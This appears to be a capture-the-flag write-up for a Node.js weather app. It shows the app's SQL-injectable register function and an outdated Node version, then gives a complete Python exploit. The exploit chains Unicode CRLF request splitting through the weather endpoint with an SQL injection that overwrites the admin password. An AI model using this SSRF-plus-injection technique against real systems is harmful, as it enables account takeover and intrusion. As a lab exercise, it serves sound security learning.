Ahh, a web challenge with source! Immediately a few things pop up analyzing the code:

If we manage to log into the app as admin, we immediately get the flag:
```JavaScript
router.post('/login', (req, res) => {
        let { username, password } = req.body;

        if (username && password) {
                return db.isAdmin(username, password)
                        .then(admin => {
                                if (admin) return res.send(fs.readFileSync('/app/flag').toString()
```

The register function is vulnerable to SQL injection:
```JavaScript
    async register(user, pass) {
        // TODO: add parameterization and roll public
        return new Promise(async (resolve, reject) => {
            try {
                let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                resolve((await this.db.run(query)));
            } catch(e) {
                reject(e);
            }
        });
    }
```

Our node-version is very outdated, as seen in the package.json:
```JavaScript
{
        "name": "weather-app",
        "version": "1.0.0",
        "description": "",
        "main": "index.js",
        "nodeVersion": "v8.12.0",
        "scripts": {
                "start": "node index.js"
        },
```

Okay, so that's quite a few things. We know that the app is vulnerable to request-splitting SSRF, and in order to exploit this, we need to manipulate some sort of POST-request. 

The app makes 3 post-requests to the following endpoints: ``api/weather + /register + /login``

We've noticed that /register is vulnerable to SQL injection, so it is likely that this is the endpoint we want to exploit. We do, however, notice the following:
```JavaScript
router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}
...
}
```

In other words we can only make post-requests to /register if we're on the local host. Likely this means we have to actually send a payload to /api/weather containing some SQL that either alters the password of our admin user, or deletes and creates another one. Lets try.

```Python
import requests

space = "\u0120"
r = "\u010D"
n = "\u010A"

username = "admin"
password = "') ON CONFLICT (username) DO UPDATE SET password = 'passwd123';--"
password = password.replace(" ", space).replace("'", "%27").replace('"', "%22")

endpoint = "127.0.0.1/" + "\u0120" + "HTTP/1.1" + "\u010D\u010A" + "Host:" + "\u0120"\ + "127.0.0.1" + "\u010D\u010A" + "\u010D\u010A" + "POST" + "\u0120" + "/register" +\ "\u0120" + "HTTP/1.1" + "\u010D\u010A" + "Host:" + "\u0120" + "127.0.0.1" + "\u010D\u010A"\ + "Content-Type:" + "\u0120" + "application/x-www-form-urlencoded" + "\u010D\u010A" + \ "Content-Length:" + "\u0120" + str(len(username) + len(password) + 19) + \ "\u010D\u010A" + "\u010D\u010A" + "username=" + username + "&password=" + password\ + "\u010D\u010A" + "\u010D\u010A" + "GET" + "\u0120"

response = requests.post("http://127.0.0.1:1337/api/weather", json={'endpoint': endpoint, 'city': 'Copenhagen', 'country': 'DK'}, headers={'Connection':'close'})

print(response.text)
```

